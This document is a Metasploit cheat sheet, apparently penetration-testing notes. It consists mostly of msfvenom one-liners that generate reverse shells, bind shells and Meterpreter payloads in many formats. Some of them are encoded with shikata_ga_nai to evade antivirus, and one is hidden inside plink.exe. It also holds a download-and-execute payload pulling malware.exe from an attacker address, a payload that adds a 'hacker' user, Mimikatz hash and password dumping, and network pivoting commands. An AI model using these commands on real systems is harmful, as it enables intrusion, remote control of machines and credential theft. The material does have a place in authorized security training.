## msfvenom
-----

#### Run whoami and pipe to text file ####

```msfvenom -p windows/x64/exec -a x64 --platform windows CMD='cmd "/c whoami > c:\test.txt"' -f exe -o Program.exe```

-----

#### var name "payload" and type python, windows non-staged reverse shell

```msfvenom -p windows/shell_reverse_tcp -f py --var-name payload LHOST=10.11.0.111 LPORT=7171```

-----


#### windows non-staged reverse shell, x86, C, exclude x00,x0a,x0d, encode shikata

```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4448 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai```

-----


#### windows staged reverse shell, output to shell.exe

```msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.111 LPORT=4447 -f exe -o shell.exe```

-----


#### linux x86, python, staged meterpreter

```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.111 LPORT=6969 -f python```

-----


#### windows non-staged meterpreter reverse shell, VBScript

```msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.0.103 LPORT=4444 EXITFUNC=thread -f vbs --arch x86 --platform win```

-----


#### windows aspx non-staged reverse shell

```msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4450 -e x86/shikata_ga_nai -o shell.aspx```

-----


#### PHP meterpreter staged reverse shell

```msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f raw -o shell.php```

-----


#### Java WAR non-staged reverse shell

```msfvenom -p java/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f war -o shell.war```

-----


#### linux x86 bind shell, shikata encoded, excluded values

```msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b “\x00\x0a\x0d\x20” -e x86/shikata_ga_nai```

-----


#### FreeBSD ELF reverse shell, non-staged

```msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f elf -o shell.elf```

-----


#### Linux non-staged reverse shell (shellcode)

```msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -e x86/shikata_ga_nai -f c```

-----


#### Windows Python non-staged reverse shell

```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 EXITFUNC=thread -f python -o shell.py```

-----


#### Windows Javascript non-staged reverse shell with NOPs

```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f js_le -e generic/none -n 18```

-----


#### Windows Powershell non-staged reverse shell

```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1```

-----


#### Windows x64 non-staged reverse shell

```msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f exe -o shell.exe```

-----


#### Windows non-staged reverse shell embedded into plink

```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe```

-----


#### Download and execute (windows)

```msfvenom -p windows/download_exec URL=http://10.11.0.111/malware.exe -f py --var-name shellcode```

-----


#### Create user (windows)

```msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe```

-----


## Mimikatz
-----

#### Password and Hash gathering (windows)

*In meterpreter session*
```
load mimikatz
msv
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::searchPasswords
```

-----


## Other
-----

#### SOCKS4 proxy through target

```
run autoroute -s 10.1.1.0/24
run autoroute -p
use auxiliary/scanner/portscan/tcp 
auxiliary/server/socks4a
```

-----


#### Attempt to connect back on all ports (when unsure of egress rules)

```payload/reverse_tcp_allports```

-----


#### Set global parameters

```setg```

-----


#### add nmap scan to database

```db_nmap 10.11.1.0/24 --top-ports 20```

-----


#### post exploitation / privesc

```post/multi/recon/local_exploit_suggester```

-----


#### list encoders

```msfvenom -l encoders```

```
Name                          Rank       Description
----                          ----       -----------
cmd/brace                     low        Bash Brace Expansion Command Encoder
cmd/echo                      good       Echo Command Encoder
cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
cmd/perl                      normal     Perl Command Encoder
cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
generic/eicar                 manual     The EICAR Encoder
generic/none                  normal     The "none" Encoder
mipsbe/byte_xori              normal     Byte XORi Encoder
mipsbe/longxor                normal     XOR Encoder
mipsle/byte_xori              normal     Byte XORi Encoder
mipsle/longxor                normal     XOR Encoder
php/base64                    great      PHP Base64 Encoder
ppc/longxor                   normal     PPC LongXOR Encoder
ppc/longxor_tag               normal     PPC LongXOR Encoder
ruby/base64                   great      Ruby Base64 Encoder
sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
x64/xor                       normal     XOR Encoder
x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
x64/xor_dynamic               normal     Dynamic key XOR Encoder
x64/zutto_dekiru              manual     Zutto Dekiru
x86/add_sub                   manual     Add/Sub Encoder
x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
x86/bmp_polyglot              manual     BMP Polyglot
x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
x86/countdown                 normal     Single-byte XOR Countdown Encoder
x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
x86/nonalpha                  low        Non-Alpha Encoder
x86/nonupper                  low        Non-Upper Encoder
x86/opt_sub                   manual     Sub Encoder (optimised)
x86/service                   manual     Register Service
x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
x86/single_static_bit         manual     Single Static Bit
x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
x86/xor_dynamic               normal     Dynamic key XOR Encoder
```

-----


#### list options

```options -h```

```
root@Kali:~# msfvenom -h
 MsfVenom - a Metasploit standalone payload generator.
 Also a replacement for msfpayload and msfencode.
 Usage: /usr/bin/msfvenom [options] 
 Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST= -f exe -o payload.exe
 Options:
     -l, --list                 List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
     -p, --payload           Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
         --list-options               List --payload 's standard, advanced and evasion options
     -f, --format             Output format (use --list formats to list)
     -e, --encoder           The encoder to use (use --list encoders to list)
         --sec-name            The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
         --smallest                   Generate the smallest possible payload using all available encoders
         --encrypt             The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
         --encrypt-key         A key to be used for --encrypt
         --encrypt-iv          An initialization vector for --encrypt
     -a, --arch                 The architecture to use for --payload and --encoders (use --list archs to list)
         --platform         The platform for --payload (use --list platforms to list)
     -o, --out                  Save the payload to a file
     -b, --bad-chars            Characters to avoid example: '\x00\xff'
     -n, --nopsled            Prepend a nopsled of [length] size on to the payload
         --pad-nops                   Use nopsled size specified by -n  as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
     -s, --space              The maximum size of the resulting payload
         --encoder-space      The maximum size of the encoded payload (defaults to the -s value)
     -i, --iterations          The number of times to encode the payload
     -c, --add-code             Specify an additional win32 shellcode file to include
     -x, --template             Specify a custom executable file to use as a template
     -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
     -v, --var-name            Specify a custom variable name to use for certain output formats
     -t, --timeout            The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
     -h, --help                       Show this message
```

-----



